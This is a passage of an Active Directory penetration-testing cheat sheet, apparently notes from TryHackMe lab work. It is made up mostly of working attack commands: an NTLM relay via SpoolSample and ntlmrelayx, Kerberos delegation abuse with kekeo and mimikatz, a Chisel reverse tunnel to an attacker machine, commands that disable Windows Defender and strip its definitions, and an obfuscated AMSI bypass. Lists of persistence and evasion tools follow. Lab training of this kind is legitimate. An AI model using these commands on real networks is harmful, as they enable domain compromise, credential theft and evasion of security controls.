- If pwned we can use them with `psexec.py` to get a shell
- We can also try to crack teh hases using `hashcat`
```bash
hashcat -m 1000 hashes ~/Desktop/rockyou.txt -r InsidePro-PasswordsPro.rule
```

## Finding Printers:
- We can use this to find printers
```bash
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
# or
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```

## SpoolSample to exploit Authentication Relays:
- If we have these conditions fullfiled we can do a authentication relay
```
1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.
```
- We can use `sppolsample.exe` to force THMSERVER2 to authenticate and then use `ntlmrelayx.py` to relay the authentication to THMSERVER1
- We need to use the IP of THMSERVER1
```bash
impacket-ntlmrelayx -smb2support -t smb://10.200.83.201 -debug
```

- And on THMWRK1 we can use
```bash
.\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.81.121
```

- Dumped hashes
- If we want to use commands we can use
```bash
impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
```

## Delegations:
- To check for Unconstrained Delegation
```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```
- To check for Constrained Delegation
```bash
Get-NetUser -TrustedToAuth
```
- To check for Resource Based Constrained Delegation we can use `StandIn.exe` which gives all three delegations
```bash
StandIn.exe --delegation
```

## Kerberos Delegation
- If we have a password for the service account that can be used we can use `kekeo` and `mimikatz` to get it
- For example we have HTTP and WSMAN that we can use
```bash
# In kekeo
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@

# http
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:http/THMSERVER1.za.tryhackme.loc
# wsman
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:wsman/THMSERVER1.za.tryhackme.loc
```

- Then we can use `mimikatz` to import them
```bash
# http
kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
# wsman
kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

- Now we can use WSMAN to create a new session on the PC
```bash
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

## Pivoting
- Chisel
```bash
# On Kali
./chisel server -p 80 --reverse

# On Victim
./chisel client 10.10.14.2:80 R:socks
```

- SSHuttle
```bash
sshuttle -r riley@10.10.110.35 192.168.110.0/24 -x 10.10.110.35
```

## Fingerprinting Antivirus:
```bash
wmic.exe /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get *
```

## Windows Defender Exclusions:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
```

## Persistence Mechanisms:
- C2
- COM Persistence
- DLL Hijacked Persistence
- DLL Side Loading
- Task Scheduler
- Registry Keys
- Startup Folder
- `SharpPersist`
- `Fake-AMSI-Provider`

## Initial Access:
- VBA Stomping/Purging

## Constrained Language Mode
- We can see of the language mode is constrained using
```bash
$ExecutionContext.SessionState.LanguageMode
```

## Defender:
- We can make the download functionality defender less
```bash
Set-MpPreference -DisableIOAVProtection $true
```
- We can turn Real Time Protection off
```bash
Set-MpPreference -DisableRealTimeMonitoring $true
```
- We can also remove all virus definations and let it run
```bash
& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
```

- Check blocked threats
```bash
Get-MpThreatDetection
```

## Firewall Exception
- Adding exception for one port in firewall
```bash
netsh advfirewall firewall add rule name="allow" dir=in action=allow protocol=tcp localport=443
```

## Applocker Policy
- We can get Applocker policy using
```bash
Get-AppLockerPolicy -Effective
```

## AMSI Bypass
- Can use this bypass
```bash
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
- Other bypasses: 
- `amsi.fail`
- `https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell`
- `https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/`
- `https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/`
- AMS-BP
- `SharpUnhooker`
- `SysCallAMSIScanBufferBypass`
- AMSI Trigger
- PS-AMSI
- ThreatCheck
- DefenderCheck

## Some AD Attacks:
- KerbRelayUP
- ZeroLogon
- PrintNightmare
- PrintSpooler
- PetitPotam

## Automation
- `WinPWN`
- `autoenum`
- `threader3000`